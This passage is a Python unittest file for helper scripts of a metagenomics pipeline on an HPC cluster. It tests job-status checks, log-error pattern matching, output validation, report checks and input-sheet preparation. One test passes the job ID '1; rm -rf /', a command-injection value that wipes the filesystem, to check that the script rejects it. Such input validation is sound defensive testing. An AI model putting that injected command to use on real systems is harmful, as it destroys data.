        self.assertEqual(self.status("1.s")[0], 0); self.assertEqual(self.status("1.s", "3.s")[0], 3)
        rc, out = self.status("9.s"); self.assertEqual(rc, 4); self.assertEqual(json.loads(out)["overall"], "UNRESOLVED")
        rc, out = self.status("1.s", "9.s"); self.assertEqual(rc, 4)
        rc, out = self.status("3.s", "9.s"); self.assertEqual(rc, 3); self.assertEqual(json.loads(out)["overall"], "IN_PROGRESS")

    def test_resource_note_and_signal_meaning(self):
        _, out = self.status("2.s"); j = json.loads(out)["jobs"][0]
        self.assertIn("memory", j["resource_note"]); self.assertIn("signal 15", j["detail"])

    def test_falls_back_when_qstat_lacks_x(self):
        rc, out = self.status("1.s", env=self.cl.env(MOCK_NO_X="1")); self.assertEqual(rc, 0, out)

    def test_bad_id_and_missing_qstat(self):
        self.assertEqual(run("check_job_status.py", "--jobs", "1; rm -rf /", env=self.cl.env())[0], 2)
        env = dict(os.environ, PATH="/usr/bin:/bin"); self.assertEqual(run("check_job_status.py", "--jobs", "1.s", env=env)[0], 2)


# ---------------------------------------------------------------- logs
class TestLogs(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp())

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def scan(self, text, name="x.o1"):
        f = write(self.tmp / name, text); return run("scan_logs.py", f, "--format", "json")

    def ids(self, text):
        rc, out = self.scan(text); return rc, {f["pattern"] for f in json.loads(out)["findings"]}

    def test_signatures(self):
        cases = {"=>> PBS: job killed: walltime 7300 exceeded limit 7200": "pbs-walltime",
                 "=>> PBS: job killed: mem 320000000kb exceeded limit 314572800kb": "pbs-memory",
                 "FATAL:   container creation failed: mount hook": "apptainer-bind-missing",
                 "bash: apptainer: command not found": "command-not-found",
                 "gzip: x.gz: unexpected end of file": "truncated-fastq",
                 "ERROR: Failed to open file: S1_1.fq.gz": "fastp-open-fail",
                 "kraken2: database (\"/db\") does not contain necessary file taxo.k2d": "kraken-db",
                 "Error: /db/database100mers.kmer_distrib does not exist": "bracken-kmer",
                 "/spool/x.SC: line 3: $'\\r': command not found": "crlf-script",
                 "Disk quota exceeded": "disk-full"}
        for line, pid in cases.items():
            rc, ids = self.ids(line + "\n"); self.assertIn(pid, ids, line); self.assertEqual(rc, 1, line)

    def test_bracken_error_is_not_labelled_as_an_r_error(self):
        _, ids = self.ids("Error: /db/database100mers.kmer_distrib does not exist\n")
        self.assertNotIn("r-error", ids)
        _, ids = self.ids("Error in model.matrix(~lab): one level\nExecution halted\n"); self.assertIn("r-error", ids)

    REAL_BRACKEN = ">> ERROR: Input file /scratch/mp96/USER/mima_tutorial/output/Taxonomy_profiling/kraken2/SRR17380115.kraken2.report does not exist"
    REAL_MV = "mv: cannot stat 'kraken2/SRR17380115.kraken2_bracken_species.report': No such file or directory"

    def test_real_bracken_failure_is_named_specifically(self):
        """Lines seen on Gadi map to the specific patterns, not to the generic file-not-found or bracken-kmer."""
        _, ids = self.ids(self.REAL_BRACKEN + "\n")
        self.assertIn("bracken-input-missing", ids)
        self.assertNotIn("file-not-found", ids); self.assertNotIn("bracken-kmer", ids)
        _, ids = self.ids(self.REAL_MV + "\n")
        self.assertIn("bracken-outputs-not-moved", ids); self.assertNotIn("file-not-found", ids)

    def test_supersede_hides_only_the_same_line(self):
        rc, ids = self.ids(self.REAL_MV + "\ncp: cannot stat 'a.txt': No such file or directory\n")
        self.assertEqual(rc, 1)
        self.assertIn("bracken-outputs-not-moved", ids)
        self.assertIn("file-not-found", ids, "an unrelated missing-file line must still be reported")

    def test_supersedes_ids_exist(self):
        data = json.loads((SC / "error_patterns.json").read_text())["patterns"]
        known = {p["id"] for p in data}
        for p in data:
            for s in p.get("supersedes", []): self.assertIn(s, known, p["id"])

    def test_clean_log_exits_zero(self):
        rc, _ = self.scan("all fine\n"); self.assertEqual(rc, 0)

    def test_catalogue_integrity_and_honest_labelling(self):
        data = json.loads((SC / "error_patterns.json").read_text())
        ids = [p["id"] for p in data["patterns"]]; self.assertEqual(len(ids), len(set(ids)))
        for p in data["patterns"]:
            re.compile(p["regex"]); self.assertIsInstance(p["verified"], bool)
            for k in ("severity", "confidence", "cause", "fix"): self.assertTrue(p[k])
        rc, out = run("scan_logs.py", write(self.tmp / "u.o1", "Disk quota exceeded\n"))
        unverified = [p for p in data["patterns"] if not p["verified"]]
        if unverified: self.assertIn("UNVERIFIED", out)

    def test_verified_patterns_carry_evidence_and_match_it(self):
        """'verified' must mean a real log line was seen: each verified pattern records where, and its regex matches the recorded line."""
        data = json.loads((SC / "error_patterns.json").read_text())["patterns"]
        verified = [p for p in data if p["verified"]]
        self.assertGreaterEqual(len(verified), 3)
        for p in verified:
            ev = p.get("evidence"); self.assertTrue(ev and ev.get("observed_line") and ev.get("source"), p["id"])
            self.assertTrue(re.search(p["regex"], ev["observed_line"]), f"{p['id']} does not match its own evidence")
        for p in data:
            if not p["verified"]: self.assertNotIn("evidence", p, f"{p['id']} has evidence but is not marked verified")
        for pid, line in (("calc-shannon-input", "  Input data must be a numeric vector or matrix."),
                          ("humann-header-unrecognised", "ValueError: Could not detect data matrix format"),
                          ("file-not-found-errno2", "[Errno 2] No such file or directory: 'a,b'")):
            self.assertIn(pid, [p["id"] for p in verified], pid)
            f = write(self.tmp / f"{pid}.log", "ok\n" + line + "\n")
            rc, out = run("scan_logs.py", f); self.assertEqual(rc, 1, out); self.assertIn(pid, out); self.assertIn("verified against a real log", out)
        clean = write(self.tmp / "clean.log", "Processing sample S1\nDone\n")
        self.assertEqual(run("scan_logs.py", clean)[0], 0, "verified patterns must not match a clean log")

    def test_alpha_diversity_error_is_not_presented_as_a_proven_container_bug(self):
        """The error line was observed; the cause (alpha-diversity.R line 21) is the project owner's reading and unconfirmed."""
        p = {x["id"]: x for x in json.loads((SC / "error_patterns.json").read_text())["patterns"]}["calc-shannon-input"]
        self.assertIn("unconfirmed", p["cause"]); self.assertNotIn("Container bug:", p["cause"])
        self.assertIn("unconfirmed", (SKILL / "references/troubleshooting.md").read_text())
        self.assertTrue((SKILL / "references/lab-defaults.md").is_file())

    def test_no_logs_found(self):
        (self.tmp / "empty").mkdir(exist_ok=True); self.assertEqual(run("scan_logs.py", self.tmp / "empty")[0], 2)


# ---------------------------------------------------------------- outputs
def build_run_tree(R, samples=("S1", "S2", "S3")):
    R = Path(R)
    for s in samples:
        for f in (f"{s}.sh", f"{s}_qc_module.log", f"QCReport/{s}.json", f"CleanReads/{s}_clean_1.fq.gz", f"CleanReads/{s}_clean_2.fq.gz"):
            write(R / "QC_module" / f)
        T = R / "Taxonomy_profiling"
        for f in (f"{s}.sh", f"{s}_bracken.log", f"kraken2/{s}.kraken2.output", f"kraken2/{s}.kraken2.report"):
            write(T / f)
        for r, pl in RANKS.items():
            write(T / "bracken" / f"{s}_{r}"); write(T / "bracken" / f"{s}.kraken2_bracken_{pl}.report")
        F = R / "Function_profiling"; write(F / f"{s}.pbs")
        for k in ("genefamilies", "pathabundance", "pathcoverage"):
            write(F / f"{s}_combine_{k}.tsv")
    write(R / "QC_module/QC_module_0.o1001", "+ done\n")
    write(R / "QC_module/QC_report.csv", "SampleId,log_status,Rawreads_seqs,Derep_seqs,dedup_percentage,Post_QC\n" + "".join(f"{s},OK,1000000,990000,0.01,{900000 - i * 1000}\n" for i, s in enumerate(samples)))
    write(R / "Taxonomy_profiling/mima-taxa.o1002", "+ done\n")
    write(R / "Taxonomy_profiling/bracken-summary.tsv", "sampleID\ttaxon_rank\tlog_status\tthreshold\tnum_taxon\n" + "".join(f"{s}\tphylum\tok-reads_unclassified\t100\t9\n" for s in samples))
    for r in RANKS:
        for suf in ("", "_counts", "_relAbund"):
            write(R / "Taxonomy_profiling/featureTables" / f"bracken_FT_{r}{suf}", "name\t" + "\t".join(samples[:2]) + "\nx\t1\t2\n")
    for n in ("merge_humann3table_genefamilies.txt", "merge_humann3table_genefamilies.cpm.txt", "merge_humann3table_genefamilies.cmp_uniref90_KO.txt",
              "merge_humann3table_pathabundance.txt", "merge_humann3table_pathabundance.cmp.txt", "merge_humann3table_pathcoverage.txt", "merge_humann3table_pathcoverage.cmp.txt"):
        write(R / "Function_profiling/featureTables" / n, ("# Gene Family" if "genefamilies" in n else "# Pathway") + "\tS1\tS2\nA\t1\t2\n")
    write(R / "Function_profiling/mima-func.o1003", "+ done\n")
    for n in ("LAB.select.top_7_.barchart.pdf", "LAB.select.top_7_seperategroup.barchart.pdf", "LAB.select.average.top_7_.barchart.pdf",
              "LAB.select.average.top_7_seperategroup.barchart.pdf", "LAB.select.meta.txt", "LAB.select.table.txt"):
        write(R / "bar" / n)
    A = R / "analysis"; write(A / "Kraken_alpha/alpha_diversity_raw_data.txt")
    for sub, n in (("corrected_sig", 2), ("non_sig", 2), ("uncorrected_sig", 0)):
        (A / "Kraken_alpha/boxplots" / sub).mkdir(parents=True, exist_ok=True)
        for i in range(n): write(A / "Kraken_alpha/boxplots" / sub / f"m{i}.png")
    write(A / "Kraken_beta/permanova/lab_results.tsv"); write(A / "Kraken_beta/plots/pcoa.png")
    for sub in ("barplot", "volcano", "wilcox-pairwise", "boxplots/corrected_sig", "boxplots/uncorrected_sig"):
        (A / "Kraken_diff-abundance" / sub).mkdir(parents=True, exist_ok=True)
    C = R / "rf"
    for k in ("1", "all"):
        write(C / f"roc_data_{k}.pdf"); write(C / f"roc_data_{k}_classifier.pdf")
    for f in ("cv_auc.pdf", "roc_classif.randomForest_dataset.pdf", "socket_cluster_log.txt"):
        write(C / f)
    write(R / "manifest.csv", "Sample_ID,FileID_R1,FileID_R2\n" + "".join(f"{s},{s}_1.fq.gz,{s}_2.fq.gz\n" for s in samples))


STAGE_DIRS = {"qc": "QC_module", "taxa": "Taxonomy_profiling", "taxa-tables": "Taxonomy_profiling/featureTables", "func": "Function_profiling",
              "func-tables": "Function_profiling/featureTables", "vis-barplot": "bar", "diversity": "analysis", "classifier": "rf"}


class TestOutputs(unittest.TestCase):
    def setUp(self):
        self.R = Path(tempfile.mkdtemp()); build_run_tree(self.R)

    def tearDown(self):
        shutil.rmtree(self.R, ignore_errors=True)

    def check(self, stage, *extra):
        return run("check_outputs.py", "--stage", stage, "--dir", self.R / STAGE_DIRS[stage], "--manifest", self.R / "manifest.csv", *extra) if stage in ("qc", "taxa", "taxa-tables") \
            else run("check_outputs.py", "--stage", stage, "--dir", self.R / STAGE_DIRS[stage], *extra)

    def test_healthy_run_passes_every_stage(self):
        for stage in STAGE_DIRS:
            rc, out = self.check(stage); self.assertEqual(rc, 0, f"{stage}:\n{out}")

    def test_dropped_sample_and_gene_header_are_warnings(self):
        _, out = self.check("taxa-tables"); self.assertIn("S3", out); self.assertIn("threshold", out)
        _, out = self.check("func-tables"); self.assertIn("# Gene", out); self.assertIn("rejects", out)

    def test_qc_damage(self):
        (self.R / "QC_module/CleanReads/S2_clean_2.fq.gz").unlink()
        write(self.R / "QC_module/CleanReads/S3_clean_1.fq.gz", "")
        write(self.R / "QC_module/QC_report.csv", "SampleId,log_status,Rawreads_seqs,Derep_seqs,dedup_percentage,Post_QC\nS1,OK,100,99,0.1,90\nS2,missing JSON log,100,99,0.1,90\nS3,OK,100,99,0.1,0\n")
        write(self.R / "QC_module/QC_module_1.o1009", "=>> PBS: job killed: walltime 7300 exceeded limit 7200\n")
        rc, out = self.check("qc"); self.assertEqual(rc, 1)
        for needle in ("S2_clean_2.fq.gz", "empty file", "log_status", "zero reads", "pbs-walltime"):
            self.assertIn(needle, out)

    def test_taxa_damage(self):
        (self.R / "Taxonomy_profiling/bracken/S2_genus").unlink()
        write(self.R / "Taxonomy_profiling/bracken-summary.tsv", "sampleID\ttaxon_rank\tlog_status\tthreshold\tnum_taxon\nS1\tphylum\tfailed\t100\t0\n")
        rc, out = self.check("taxa"); self.assertEqual(rc, 1); self.assertIn("S2_genus", out); self.assertIn("absent from bracken-summary", out)

    def test_diversity_and_classifier_damage(self):
        shutil.rmtree(self.R / "analysis/Kraken_beta"); rc, out = self.check("diversity"); self.assertEqual(rc, 1); self.assertIn("_beta", out)
        (self.R / "rf/roc_data_1.pdf").unlink(); rc, out = self.check("classifier"); self.assertEqual(rc, 1); self.assertIn("roc_data_1.pdf", out)

    def test_diversity_flags_container_alpha_bug_from_log(self):
        write(self.R / "visualisation.log", "Error in calc_shannon(data = x, base = exp(1)) : \n  Input data must be a numeric vector or matrix.\n")
        rc, out = self.check("diversity"); self.assertEqual(rc, 1); self.assertIn("calc-shannon", out)

    def test_missing_directory(self):
        self.assertEqual(run("check_outputs.py", "--stage", "qc", "--dir", self.R / "nope")[0], 2)

    def _samples(self):
        return [l.split(",")[0] for l in (self.R / "manifest.csv").read_text().splitlines()[1:]]

    def test_json_summary_counts_missing_files_per_sample(self):
        s, T = self._samples(), self.R / "Taxonomy_profiling"
        (T / "kraken2" / f"{s[0]}.kraken2.report").unlink()
        (T / f"{s[0]}_bracken.log").unlink()
        (T / "kraken2" / f"{s[1]}.kraken2.output").unlink()
        rc, out = self.check("taxa", "--format", "json")
        d = json.loads(out)
        self.assertEqual(rc, 1)
        self.assertEqual(d["summary"]["missing_or_empty_files"], 3)
        self.assertEqual(d["summary"]["samples_with_missing_or_empty_files"], 2)
        self.assertEqual(d["summary"]["missing_or_empty_files_by_sample"], {s[0]: 2, s[1]: 1})
        self.assertEqual(d["summary"]["errors"], 3)
        self.assertTrue(all(f.get("sample") and f.get("kind") == "missing" for f in d["findings"] if f["severity"] == "error"))
        self.assertEqual(len(d["findings"]), len([f for f in d["findings"] if f["message"].startswith("missing: ")]))

    def test_summary_separates_empty_files_and_stays_zero_when_healthy(self):
        rc, out = self.check("taxa", "--format", "json")
        d = json.loads(out); self.assertEqual(rc, 0)
        self.assertEqual((d["summary"]["errors"], d["summary"]["missing_or_empty_files"]), (0, 0))
        s = self._samples()[0]
        write(self.R / "Taxonomy_profiling" / "kraken2" / f"{s}.kraken2.report", "")
        rc, out = self.check("taxa", "--format", "json")
        d = json.loads(out); self.assertEqual(rc, 1)
        self.assertEqual([f["kind"] for f in d["findings"] if f["severity"] == "error"], ["empty"])
        self.assertEqual(d["summary"]["missing_or_empty_files_by_sample"], {s: 1})

    def test_text_output_has_a_summary_line(self):
        s = self._samples()
        (self.R / "Taxonomy_profiling" / f"{s[0]}_bracken.log").unlink()
        rc, out = self.check("taxa")
        self.assertEqual(rc, 1); self.assertIn("SUMMARY missing or empty files: 1 across 1 sample(s)", out)


# ---------------------------------------------------------------- report
GOOD_REPORT = """# T
## 1. Summary
Nine samples.
## 2. Objective and design
x
## 3. Data
x
## 4. Methods
```
apptainer run --app mima-qc $SANDBOX
```
## 5. Results
### 5.1 Quality control
Median 1.1 million reads (source: `QC_report.csv`).
## 6. Quality checks and deviations
none
## 7. Limitations
x
## 8. Reproducibility
x
## 9. Files delivered
x
"""


class TestReport(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp())

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_raw_template_rejected(self):
        rc, out = run("check_report.py", SKILL / "assets/report-template.md"); self.assertEqual(rc, 1); self.assertIn("placeholder", out)

    def test_complete_report_passes_and_stage_rules(self):
        f = write(self.tmp / "r.md", GOOD_REPORT)
        self.assertEqual(run("check_report.py", f, "--stages", "qc")[0], 0)
        rc, out = run("check_report.py", f, "--stages", "qc", "taxa"); self.assertEqual(rc, 1); self.assertIn("5.2 is missing", out)
        rc, out = run("check_report.py", f, "--stages"); self.assertEqual(rc, 1); self.assertIn("5.1 is present", out)

    def test_structure_errors_and_source_warning(self):
        rc, out = run("check_report.py", write(self.tmp / "a.md", GOOD_REPORT.replace("## 7. Limitations\nx\n", ""))); self.assertEqual(rc, 1); self.assertIn("## 7.", out)
        rc, out = run("check_report.py", write(self.tmp / "b.md", GOOD_REPORT.replace("```\napptainer run --app mima-qc $SANDBOX\n```\n", "ran\n"))); self.assertEqual(rc, 1)
        rc, out = run("check_report.py", write(self.tmp / "c.md", GOOD_REPORT.replace(" (source: `QC_report.csv`)", ""))); self.assertEqual(rc, 0); self.assertIn("no named source", out)


# ---------------------------------------------------------------- consistency of the skill itself
class TestContainerFindings(unittest.TestCase):
    """Behaviour added from the container code read on Gadi (2026-10-07)."""
    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp())

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_rf_column_substring_warns(self):
        m = write(self.tmp / "m.tsv", "SN\tGender\tGender_2\nS1\tF\tx\nS2\tM\ty\nS3\tF\tx\nS4\tM\ty\n")
        rc, out = run("validate_metadata.py", m, "--group-column", "Gender")
        self.assertIn("part of other column names", out); self.assertIn("Gender_2", out)
        m2 = write(self.tmp / "m2.tsv", "SN\tGender\tAge\nS1\tF\t1\nS2\tM\t2\n")
        self.assertNotIn("part of other column names", run("validate_metadata.py", m2, "--group-column", "Gender")[1])

    def test_qc_report_current_column_names(self):
        R = self.tmp / "run"
        build_run_tree(R)
        write(R / "QC_module/QC_report.csv", "SampleId,log_status,Rawreads_seqs,Derep_seqs,dedup_percentage,Post_QC_seqs,low_quality_reads(%),Host_seqs,Host(%),Clean_reads\n"
              "S1,OK,100,99,0.1,90,9.1,1,1.1,89\nS2,OK,100,99,0.1,90,9.1,1,1.1,89\nS3,OK,100,99,0.1,90,9.1,90,100,0\n")
        rc, out = run("check_outputs.py", "--stage", "qc", "--dir", R / "QC_module", "--manifest", R / "manifest.csv")
        self.assertNotIn("could not read", out); self.assertIn("S3: zero reads left after QC", out)

    def test_new_options_accepted_and_documented(self):
        plan = lambda m, p: write(self.tmp / "p.json", json.dumps({"module": m, "params": p}))
        rc, out = run("build_command.py", plan("mima-function-profiling", {"-i": "/w/c", "-o": "/w/o", "--nucleotide-database": "/d/c", "--protein-database": "/d/u", "--utility-database": "/d/m",
                      "--metaphlan-options": "++bowtie2db /d/mp", "--mode": "container", "--pbs-config": "/w/f.cfg", "--mpa3": True, "-w": 24}))
        self.assertEqual(rc, 0, out); self.assertIn("--mpa3", out)
        rc, out = run("build_command.py", plan("mima-qc", {"-i": "/w/r", "-o": "/w/o", "-m": "/w/m.csv", "--ref": "/d/g.fna", "-s": 2}))
        self.assertIn("--mode omitted", out); self.assertIn("default is 'container'", out)
        rc, out = run("build_command.py", plan("mima-visualisation", {"--feature-table": ["/w/a_relAbund", "/w/b_counts"], "--metadata": "/w/m.tsv", "--study-groups": "g", "--output-dir": "/w/o", "--plot-insignificant": True}))
        self.assertEqual(rc, 0, out); self.assertIn("--plot-insignificant", out)

    def test_spec_notes_record_findings(self):
        notes = {m: v.get("notes", "") for m, v in json.loads((SC / "command_specs.json").read_text())["modules"].items()}
        self.assertIn("no preset", notes["mima-qc"]); self.assertIn("pattern", notes["mima-classifier-RF"])
        self.assertIn("reads_unclassified", notes["mima-bracken-report"]); self.assertIn("mpa3", notes["mima-function-profiling"].lower())


class TestPrepareInputs(unittest.TestCase):
    """prepare_inputs.py: corrected copies only, nothing guessed, originals untouched."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.out = self.tmp / "prepared"

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def sheet(self, body, name="sheet.csv", raw=None):
        p = self.tmp / name
        p.write_bytes(raw if raw is not None else body.encode())
        return p

    def prep(self, *args, apply=False):
        a = list(args) + ["--out-dir", self.out, "--format", "json"] + (["--apply"] if apply else [])
        code, text = run("prepare_inputs.py", *a)
        try:
            return code, json.loads(text)
        except ValueError:
            return code, text

    MESSY = b"\xef\xbb\xbfsample;r1;r2\r\nA-1;a1_R1.fq.gz;a1_R2.fq.gz\r\nB 2;b2_R1.fq.gz;b2_R2.fq.gz\r\n"

    def test_dry_run_writes_nothing(self):
        m = self.sheet("", raw=self.MESSY)
        code, d = self.prep("--manifest", m)
        self.assertEqual((code, d["status"], d["applied"]), (0, "prepared", False))
        self.assertFalse(self.out.exists())

    def test_apply_writes_valid_copies_and_leaves_originals_alone(self):
        m = self.sheet("", raw=self.MESSY)
        md = self.sheet("sample;group\nA-1;x\nB 2;y\n", name="meta.csv")
        before = (m.read_bytes(), md.read_bytes())
        code, d = self.prep("--manifest", m, "--metadata", md, apply=True)
        self.assertEqual((code, d["status"]), (0, "prepared"), d)
        self.assertEqual((m.read_bytes(), md.read_bytes()), before)
        self.assertEqual(sorted(p.name for p in self.out.iterdir()), ["id_map.tsv", "manifest.csv", "metadata.tsv"])
        raw = (self.out / "manifest.csv").read_bytes()
        self.assertNotIn(b"\r", raw)
        self.assertFalse(raw.startswith(b"\xef\xbb\xbf"))
        self.assertTrue(raw.startswith(b"Sample_ID,FileID_R1,FileID_R2\n"))
        rows = [r.split("\t") for r in (self.out / "id_map.tsv").read_text().splitlines()]
        self.assertEqual(rows[0], ["original_id", "pipeline_id", "changed"])
        self.assertEqual({r[0]: r[1] for r in rows[1:]}, {"A-1": "A_1", "B 2": "B_2"})
        code, text = run("validate_manifest.py", self.out / "manifest.csv")
        self.assertEqual(code, 0, text)
        code, text = run("validate_metadata.py", self.out / "metadata.tsv", "--group-column", "group")
        self.assertEqual(code, 0, text)
        self.assertEqual([l.split("\t")[0] for l in (self.out / "metadata.tsv").read_text().splitlines()[1:]], ["A_1", "B_2"])

    def test_clean_manifest_is_unchanged_and_text_ends_with_result_line(self):
        m = self.sheet("Sample_ID,FileID_R1,FileID_R2\nS1,a_1.fq.gz,a_2.fq.gz\n")
        code, d = self.prep("--manifest", m, apply=True)
        self.assertEqual((code, d["status"]), (0, "unchanged"))
        code, text = run("prepare_inputs.py", "--manifest", m, "--out-dir", self.tmp / "o2")
        self.assertEqual(text.strip().splitlines()[-1], "RESULT: UNCHANGED")

    def test_headerless_and_absolute_paths(self):
        reads = self.tmp / "reads"
        reads.mkdir()
        (reads / "a_1.fq.gz").write_text("x")
        (reads / "a_2.fq.gz").write_text("x")
        m = self.sheet("S1,%s/a_1.fq.gz,%s/a_2.fq.gz\n" % (reads, reads))
        code, d = self.prep("--manifest", m, apply=True)
        self.assertEqual((code, d["status"]), (0, "prepared"), d)
        self.assertEqual((self.out / "manifest.csv").read_text(), "Sample_ID,FileID_R1,FileID_R2\nS1,a_1.fq.gz,a_2.fq.gz\n")

    def test_questions_are_asked_and_nothing_is_written(self):
        cases = {
            "swapped R1 R2": "Sample_ID,FileID_R1,FileID_R2\nS1,a_R2.fq.gz,a_R1.fq.gz\n",
            "duplicate id": "Sample_ID,FileID_R1,FileID_R2\nS1,a_1.fq.gz,a_2.fq.gz\nS1,b_1.fq.gz,b_2.fq.gz\n",
            "colliding ids": "Sample_ID,FileID_R1,FileID_R2\nA-1,a_1.fq.gz,a_2.fq.gz\nA_1,b_1.fq.gz,b_2.fq.gz\n",
            "same file both reads": "Sample_ID,FileID_R1,FileID_R2\nS1,a_1.fq.gz,a_1.fq.gz\n",
            "space in file name": "Sample_ID,FileID_R1,FileID_R2\nS1,a 1.fq.gz,a 2.fq.gz\n",
            "file used twice": "Sample_ID,FileID_R1,FileID_R2\nS1,a_1.fq.gz,a_2.fq.gz\nS2,a_1.fq.gz,b_2.fq.gz\n",
            "files in two folders": "Sample_ID,FileID_R1,FileID_R2\nS1,/d1/a_1.fq.gz,/d1/a_2.fq.gz\nS2,/d2/b_1.fq.gz,/d2/b_2.fq.gz\n",
        }
        for label, body in cases.items():
            if self.out.exists():
                shutil.rmtree(self.out)
            m = self.sheet(body)
            code, d = self.prep("--manifest", m, apply=True)
            self.assertEqual((code, d["status"]), (1, "needs_input"), label)
            self.assertTrue(d["needs_input"], label)
            self.assertFalse(self.out.exists(), label)

    def test_ambiguous_columns_are_not_guessed(self):
        m = self.sheet("id,reads,reads\nS1,a_1.fq.gz,a_2.fq.gz\n")
        code, d = self.prep("--manifest", m, apply=True)
        self.assertEqual((code, d["status"]), (1, "needs_input"), d)
        self.assertFalse(self.out.exists())

    def test_missing_files_are_reported_when_reads_dir_given(self):
        reads = self.tmp / "reads"
        reads.mkdir()
        (reads / "a_1.fq.gz").write_text("x")
        m = self.sheet("Sample_ID,FileID_R1,FileID_R2\nS1,a_1.fq.gz,a_2.fq.gz\n")
        code, d = self.prep("--manifest", m, "--reads-dir", reads)
        self.assertEqual((code, d["status"]), (1, "needs_input"), d)

    def test_from_reads_pairs_illumina_names_and_flags_unpaired(self):
        reads = self.tmp / "reads"
        reads.mkdir()
        for n in ("S1_R1.fastq.gz", "S1_R2.fastq.gz", "S2_R1.fastq.gz", "S2_R2.fastq.gz"):
            (reads / n).write_text("x")
        code, d = self.prep("--from-reads", reads, apply=True)
        self.assertEqual((code, d["status"]), (0, "prepared"), d)
        self.assertEqual((self.out / "manifest.csv").read_text().splitlines()[1:],
                         ["S1,S1_R1.fastq.gz,S1_R2.fastq.gz", "S2,S2_R1.fastq.gz,S2_R2.fastq.gz"])
        shutil.rmtree(self.out)
        (reads / "S3_R1.fastq.gz").write_text("x")
        code, d = self.prep("--from-reads", reads, apply=True)
        self.assertEqual((code, d["status"]), (1, "needs_input"), d)
        self.assertFalse(self.out.exists())

    def test_from_reads_flags_several_lanes(self):
        reads = self.tmp / "reads"
        reads.mkdir()
        for n in ("S1_L001_R1_001.fastq.gz", "S1_L001_R2_001.fastq.gz", "S1_L002_R1_001.fastq.gz", "S1_L002_R2_001.fastq.gz"):
            (reads / n).write_text("x")
        code, d = self.prep("--from-reads", reads)
        self.assertEqual((code, d["status"]), (1, "needs_input"), d)

    def test_metadata_problems_are_questions_and_one_sided_ids_warn(self):
        m = self.sheet("Sample_ID,FileID_R1,FileID_R2\nS1,a_1.fq.gz,a_2.fq.gz\nS2,b_1.fq.gz,b_2.fq.gz\n")
        md = self.sheet("sample\tgroup\nS1\tx\nS1\ty\n", name="dup_meta.tsv")
        code, d = self.prep("--manifest", m, "--metadata", md)
        self.assertEqual((code, d["status"]), (1, "needs_input"), d)
        md2 = self.sheet("sample\tgroup\nS1\tx\nS9\ty\n", name="meta2.tsv")
        code, d = self.prep("--manifest", m, "--metadata", md2)
        self.assertEqual(code, 0, d)
        self.assertTrue(d["warnings"])

    def test_unusable_output_folder_and_missing_input_exit_2(self):
        m = self.sheet("Sample_ID,FileID_R1,FileID_R2\nS1,a_1.fq.gz,a_2.fq.gz\n")
        self.out.mkdir()
        (self.out / "keep.txt").write_text("mine")
        code, _ = self.prep("--manifest", m)
        self.assertEqual(code, 2)
        self.assertEqual((self.out / "keep.txt").read_text(), "mine")
        shutil.rmtree(self.out)
        code, _ = self.prep("--manifest", self.tmp / "missing.csv")
        self.assertEqual(code, 2)

    def test_id_rule_is_in_step_with_the_validator(self):
        pat = [re.search(r"ID_BAD\s*=\s*re\.compile\((r?[\"'].*?[\"'])\)|ID_BAD\s*=\s*(.+)", (SC / f).read_text()) for f in ("prepare_inputs.py", "validate_manifest.py")]
        self.assertTrue(all(pat))
        self.assertEqual([p.group(0).split("=", 1)[1].strip() for p in pat][0], [p.group(0).split("=", 1)[1].strip() for p in pat][1])

    def test_validators_warn_about_unusual_id_characters(self):
        m = self.sheet("Sample_ID,FileID_R1,FileID_R2\nA-1,a_1.fq.gz,a_2.fq.gz\n")
        code, text = run("validate_manifest.py", m)
        self.assertEqual(code, 0, text)
        self.assertIn("letters, digits and underscores", text)
        md = self.sheet("sample\tgroup\nA-1\tx\nB-2\ty\n", name="m.tsv")
        code, text = run("validate_metadata.py", md, "--group-column", "group")
        self.assertEqual(code, 0, text)
        self.assertIn("underscores", text)


class TestMakePbsHeader(unittest.TestCase):
    """make_pbs_header.py: drafts the taxonomy header from the data; guesses nothing the user must supply."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.out = self.tmp / "pbs_header_taxa.cfg"
        self.env = {k: v for k, v in os.environ.items() if k != "PROJECT"}

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def hdr(self, *args, env=None):
        code, text = run("make_pbs_header.py", *args, "--format", "json", env=env or self.env)
        return code, json.loads(text)

    def good(self, samples=10, *extra):
        return ["--module", "taxa", "--samples", samples, "--image", "/g/data/ab01/mima.sif", "--project", "ab01",
                "--path", "/scratch/ab01/u/run", "--path", "/scratch/ab01/u/run/CleanReads", "--path", "/g/data/ab01/REFDB/GTDB_Kraken", *extra]

    def test_dry_run_writes_nothing_and_sizes_from_the_sample_count(self):
        code, d = self.hdr(*self.good(10), "--out", self.out)
        self.assertEqual((code, d["status"], d["applied"]), (0, "prepared", False))
        self.assertFalse(self.out.exists())
        lines = [x["line"] for x in d["lines"]]
        self.assertIn("#PBS -l walltime=5:00:00", lines)  # (20 x 10 = 200 min) x 1.5
        self.assertIn("#PBS -l mem=320GB", lines)
        self.assertIn("#PBS -l storage=gdata/ab01+scratch/ab01", lines)
        self.assertIn('export APPTAINER_BIND="/g/data/ab01/REFDB/GTDB_Kraken:/g/data/ab01/REFDB/GTDB_Kraken,/scratch/ab01/u/run:/scratch/ab01/u/run"', lines)
        self.assertTrue(all(x["source"] for x in d["lines"] if x["line"].startswith("#PBS -l")), "every resource line says where it came from")
        self.assertTrue(any("NOT measured" in x["source"] for x in d["lines"]))
        self.assertTrue(any("estimates" in w for w in d["warnings"]))

    def test_written_file_is_new_unix_and_passes_the_validator_without_warnings(self):
        for n in (1, 2, 10, 30, 100):
            out = self.tmp / ("h%d.cfg" % n)
            code, d = self.hdr(*self.good(n), "--queue", "hugemem", "--out", out, "--apply")
            self.assertEqual((code, d["status"], d["written"]), (0, "prepared", str(out)), d)
            self.assertNotIn(b"\r", out.read_bytes())
            vcode, text = run("validate_pbs_config.py", out, "--module", "taxa", "--samples", n)
            self.assertEqual(vcode, 0, text)
